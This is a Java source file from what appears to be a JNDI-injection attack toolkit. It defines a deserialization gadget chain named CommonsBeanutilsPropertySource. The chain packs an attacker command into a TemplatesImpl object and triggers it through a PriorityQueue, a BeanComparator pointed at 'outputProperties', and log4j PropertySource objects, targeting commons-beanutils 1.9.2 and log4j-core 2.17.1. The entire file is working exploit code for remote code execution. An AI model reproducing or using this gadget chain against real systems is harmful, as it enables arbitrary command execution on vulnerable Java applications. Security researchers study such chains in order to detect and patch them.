package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.GadgetsYso;
import com.qi4l.jndi.gadgets.utils.Reflections;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.logging.log4j.util.PropertySource;

import java.util.PriorityQueue;

import static com.qi4l.jndi.Starter.cmdLine;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "org.apache.logging.log4j:log4j-core:2.17.1"})
@Authors({"SummerSec"})
public class CommonsBeanutilsPropertySource implements ObjectPayload<Object>{
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object template;
        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
            template = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            template = Gadgets.createTemplatesImpl(type, param);
        }
        PropertySource propertySource1 = new PropertySource() {
            @Override
            public int getPriority() {
                return 0;
            }
        };

        BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator());

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);

        queue.add(propertySource1);
        queue.add(propertySource1);

        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return queue;
    }

}
